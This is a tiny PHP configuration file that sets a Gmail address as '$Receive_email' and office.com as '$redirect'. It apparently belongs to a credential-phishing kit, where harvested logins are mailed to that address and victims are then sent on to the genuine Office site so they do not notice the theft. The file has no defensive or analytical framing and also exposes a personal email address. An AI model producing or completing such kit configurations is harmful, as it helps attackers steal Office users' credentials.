<?php 
$Receive_email="arthurmason1988@gmail.com";
$redirect="https://office.com/";
?>